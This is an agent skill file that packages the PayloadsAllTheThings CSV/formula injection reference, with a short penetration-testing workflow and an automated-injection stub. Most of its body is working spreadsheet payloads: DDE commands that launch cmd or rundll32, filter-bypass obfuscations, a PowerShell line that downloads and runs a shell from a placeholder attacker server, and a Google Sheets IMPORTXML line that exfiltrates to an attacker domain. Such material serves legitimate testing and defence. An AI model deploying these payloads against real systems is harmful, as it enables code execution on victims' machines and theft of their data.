---
name: payloads-csv
description: "Many web applications allow the user to download content such as templates for invoices or user settings to a CSV file. Many users choose to open the CSV file in either Excel, Libre Office or Open Office. When a web application does not properly validate the contents of the CSV file, it could lead to contents of a cell or many cells being executed. CSV Injection, also known as Formula Injection,..."
---

# CSV Injection Payloads

> **Source:** [PayloadsAllTheThings/CSV Injection](https://github.com/swisskyrepo/payloadsallthethings/tree/master/CSV%20Injection)
> **Category:** `payloads-injection` | **Skill ID:** `payloads-csv`

## Overview

CSV/formula injection payloads for spreadsheet-based code execution attacks.

This skill integrates the full **PayloadsAllTheThings** (PATT) payload library for the **CSV Injection Payloads** domain into the REA_Skill framework. Use it during authorized penetration testing, bug bounty research, security audits, and CTF challenges.

## Workflow

### 1. Recon & Identification
- Identify the target technology stack and injection points
- Enumerate endpoints, parameters, and input vectors
- Determine applicable payload categories from the reference below

### 2. Payload Selection
- Browse the PATT payload library for the attack class
- Select encoding-appropriate payloads for the target environment
- Consider WAF bypass variants and obfuscation techniques

### 3. Exploitation (Authorized Only)
- Test payloads in order: passive → active → escalation
- Document every payload tested and its response
- Capture PoC evidence (screenshots, HTTP logs, curl output)

### 4. Verification & Reporting
- Confirm the vulnerability with a clean minimal PoC
- Map findings to CVE/CWE where applicable
- Report with remediation recommendations and code fixes

---

## Full PATT Reference

# CSV Injection

> Many web applications allow the user to download content such as templates for invoices or user settings to a CSV file. Many users choose to open the CSV file in either Excel, Libre Office or Open Office. When a web application does not properly validate the contents of the CSV file, it could lead to contents of a cell or many cells being executed.

## Summary

* [Methodology](#methodology)
    * [Google Sheets](#google-sheets)
* [References](#references)

## Methodology

CSV Injection, also known as Formula Injection, is a security vulnerability that occurs when untrusted input is included in a CSV file. Any formula can be started with:

```text
=
+
–
@
```

Basic exploits with **Dynamic Data Exchange**.

* Spawn a calc

    ```text
    DDE ("cmd";"/C calc";"!A0")A0
    @SUM(1+1)*cmd|' /C calc'!A0
    =2+5+cmd|' /C calc'!A0
    =cmd|' /C calc'!'A1'
    ```

* PowerShell download and execute

    ```text
    =cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
    ```

* Prefix obfuscation and command chaining

    ```text
    =AAAA+BBBB-CCCC&"Hello"/12345&cmd|'/c calc.exe'!A
    =cmd|'/c calc.exe'!A*cmd|'/c calc.exe'!A
    =         cmd|'/c calc.exe'!A
    ```

* Using rundll32 instead of cmd

    ```text
    =rundll32|'URL.dll,OpenURL calc.exe'!A
    =rundll321234567890abcdefghijklmnopqrstuvwxyz|'URL.dll,OpenURL calc.exe'!A
    ```

* Using null characters to bypass dictionary filters. Since they are not spaces, they are ignored when executed.

    ```text
    =    C    m D                    |        '/        c       c  al  c      .  e                  x       e  '   !   A
    ```

Technical details of the above payloads:

* `cmd` is the name the server can respond to whenever a client is trying to access the server
* `/C` calc is the file name which in our case is the calc(i.e the calc.exe)
* `!A0` is the item name that specifies unit of data that a server can respond when the client is requesting the data

### Google Sheets

Google Sheets allows some additional formulas that are able to fetch remote URLs:

* [IMPORTXML](https://support.google.com/docs/answer/3093342?hl=en)(url, xpath_query, locale)
* [IMPORTRANGE](https://support.google.com/docs/answer/3093340)(spreadsheet_url, range_string)
* [IMPORTHTML](https://support.google.com/docs/answer/3093339)(url, query, index)
* [IMPORTFEED](https://support.google.com/docs/answer/3093337)(url, [query], [headers], [num_items])
* [IMPORTDATA](https://support.google.com/docs/answer/3093335)(url)

So one can test blind formula injection or a potential for data exfiltration with:

```text
=IMPORTXML("http://[ATTACKER.DOMAIN.TLD]/csv", "//a/@href")
```

Note: an alert will warn the user a formula is trying to contact an external resource and ask for authorization.

## References

* [CSV Excel Macro Injection - Timo Goosen, Albinowax - June 21, 2022](https://web.archive.org/web/20260211194330/https://owasp.org/www-community/attacks/CSV_Injection)
* [CSV Excel formula injection - Google Bug Hunter University - May 22, 2022](https://web.archive.org/web/20251126193606/https://bughunters.google.com/learn/invalid-reports/google-products/4965108570390528/csv-formula-injection)
* [CSV Injection – A Guide To Protecting CSV Files - Akansha Kesharwani - November 30, 2017](https://web.archive.org/web/20221205154959/https://payatu.com/csv-injection-basic-to-exploit/)
* [From CSV to Meterpreter - Adam Chester - November 5, 2015](https://web.archive.org/web/20251020005639/https://blog.xpnsec.com/from-csv-to-meterpreter/)
* [The Absurdly Underestimated Dangers of CSV Injection - George Mauer - October 7, 2017](https://web.archive.org/web/20260216175809/https://georgemauer.net/2017/10/07/csv-injection.html)
* [Three New DDE Obfuscation Methods - ReversingLabs - September 24, 2018](https://web.archive.org/web/20220928031043/https://blog.reversinglabs.com/blog/cvs-dde-exploits-and-obfuscation)
* [Your Excel Sheets Are Not Safe! Here's How to Beat CSV Injection - we45 - October 5, 2020](https://web.archive.org/web/20260115180627/https://www.we45.com/post/your-excel-sheets-are-not-safe-heres-how-to-beat-csv-injection)

---

## REA MCP Integration

```javascript
// REA MCP — Automated payload injection via REA tools
// Use analyze_function, procedure_pseudo_code, or observe_native_calls
// to identify injection sinks, then apply payloads from this skill.
```

## Legal Notice

> ⚠️ **Authorized Use Only.** All payloads in this skill are for security research, penetration testing with written permission, CTF competitions, and defensive study. Unauthorized use against systems you do not own or have explicit permission to test is illegal.
